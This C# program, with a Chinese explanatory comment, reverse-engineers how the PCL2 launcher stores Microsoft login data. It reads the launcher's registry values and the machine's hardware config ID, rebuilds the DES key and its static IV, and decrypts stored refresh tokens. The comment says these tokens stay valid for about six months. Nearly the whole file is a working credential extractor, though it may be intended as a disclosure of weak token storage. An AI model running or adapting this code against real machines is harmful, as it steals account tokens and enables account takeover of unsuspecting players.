using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using Microsoft.Win32;
class PclDecrypt
{
    public static string ComputeIdentify(
        long applicationStartTick,
        string identify,
        Func<long> getTimeMs = null,
        ulong availablePhysicalMemory = 0UL)
    {
        object v = Registry.GetValue(@"HKEY_LOCAL_MACHINE\SYSTEM\HardwareConfig", "LastConfig", "Unknown");
        string lastConfig = v == null ? "Unknown" : v.ToString().ToUpper().Trim('{','}');
        Console.WriteLine(lastConfig);
        try
        {
            if (applicationStartTick < 1L)
                return "0000-0000-0000-0000";

            string str;
            if (string.IsNullOrEmpty(lastConfig))
                str = "Unknown";
            else
                str = lastConfig.ToUpperInvariant().Trim('{', '}');

            // Identify 的处理：如果长度 < 3 则用 time + availablePhysicalMemory 生成
            string text = identify ?? string.Empty;
            if (text.Length < 3)
            {
                long timeMs = getTimeMs != null ? getTimeMs() : DateTimeOffset.UtcNow.ToUnixTimeMilliseconds();
                text = timeMs.ToString() + availablePhysicalMemory.ToString();
            }

            ulong h = GetHash(str + text);
            string hex = h.ToString("X");
            string str2 = StrFill(hex, "7", 16);
            if (str2.Length < 16) str2 = str2.PadLeft(16, '7');
            string A = str2.Substring(4, 4);
            string B = str2.Substring(12, 4);
            string C = str2.Substring(0, 4);
            string D = str2.Substring(8, 4);
            return $"{A}-{B}-{C}-{D}";
        }
        catch
        {
            return "0000-0000-0000-0000";
        }
    }

    static void Main()
    {
        string keyInput = "PCL" + ComputeIdentify(1145, Registry.CurrentUser.OpenSubKey(@"Software\PCL", false).GetValue("Identify", null).ToString());
        string base64Cipher = Registry.CurrentUser.OpenSubKey(@"Software\PCL", false).GetValue("LoginMsJson", null).ToString();

        string key8 = SecretKeyGet(keyInput);
        Console.WriteLine("派生出的 8 字符密钥: " + key8);

        try
        {
            string plain = DecryptDesBase64(base64Cipher, key8);
            Console.WriteLine("解密结果:");
            Console.WriteLine(plain);
        }
        catch (Exception ex)
        {
            Console.WriteLine("解密失败: " + ex.Message);
        }
    }

    public static ulong GetHash(string s)
    {
        ulong num = 5381UL;
        for (int i = 0; i < s.Length; i++)
        {
            num = (num << 5) ^ num ^ (ulong)s[i];
        }
        return num ^ 12218072394304324399UL;
    }

    public static string StrFill(string Str, string Code, byte Length)
    {
        if (Str.Length > (int)Length) return Str.Substring(0, (int)Length);
        return Str.PadLeft((int)Length, Code[0]);
    }

    public static string SecretKeyGet(string Key)
    {
        if (string.IsNullOrEmpty(Key)) return "@;$ Abv2";
        ulong h = GetHash(Key);
        string s = h.ToString();
        string filled = StrFill(s, "X", 8);
        return filled.Substring(0, 8);
    }

    public static string DecryptDesBase64(string base64Cipher, string key8)
    {
        byte[] cipher = Convert.FromBase64String(base64Cipher);
        byte[] btKey = Encoding.UTF8.GetBytes(key8);
        if (btKey.Length != 8) throw new ArgumentException("DES key 必须为 8 字节");
        byte[] btIV = Encoding.UTF8.GetBytes("95168702");

        using (var des = new DESCryptoServiceProvider())
        using (var ms = new MemoryStream())
        using (var cs = new CryptoStream(ms, des.CreateDecryptor(btKey, btIV), CryptoStreamMode.Write))
        {
            cs.Write(cipher, 0, cipher.Length);
            cs.FlushFinalBlock();
            return Encoding.UTF8.GetString(ms.ToArray());
        }
    }
}

/*
已经实现了 前几天有点忙不好意思没回消息，。
源码和二进制都不公开防止滥用，博主想了解可以私信。简单说下原理。。
PCL 使用 DES 进行加密，具体来说使用一个 8 字符密钥和一个 8 字符静态IV 来进行加密解密。可以理解为是一种加密解密使用同一个密钥的算法（对称加密）。我对 PCL2 原版进行逆向，得到了其通过机器码和注册表 @Software/PCL/Identify 生成一个相对稳定的 key 的算法，并且成功复现，不依赖 PCL2 得到了 key。IV 因为是静态的所以直接逆向得到。之后发现其读写注册表的逻辑 Setup.Get/Set，发现使用一个自定义函数进行解密，直接抄下来即可。逆向登录逻辑，发现读写了 LoginMsJson 项。成功在只有读取 @Software/PCL/* 和设备的标识符（具体来说是 HKLM\SYSTEM\HardwareConfig\LastConfig）的情况下，解密 LoginMsJson，得到一个 json 数组，内容大致为 {"userName1": "refreshToken1", "userName2": "refreshToken2"}。经过验证，确实是 refreshToken（M.xxxx开头很大概率就已经是了）且有效期大约在半年。（个人申请的 clientID 应该在 180d 左右，不知道龙猫申请的是多长）
使用 C# 实现的代码，长度在 100 行左右。Java 大同小异。
我认为对于任何启动器，将 accessToken 暴露都是难免的事，而微软考虑到了这一点，并将 accessToken 时效强制设为 24h 以内。这规避了绝大多数盗号行为。而如果攻击者已经有能力诱导用户安装不明客户端，那么他完全可以做一个加壳的 shellcode payload，搭配 CF Tunnel 连接到攻击者的电脑实现远程控制，这不是更恐怖吗？
*/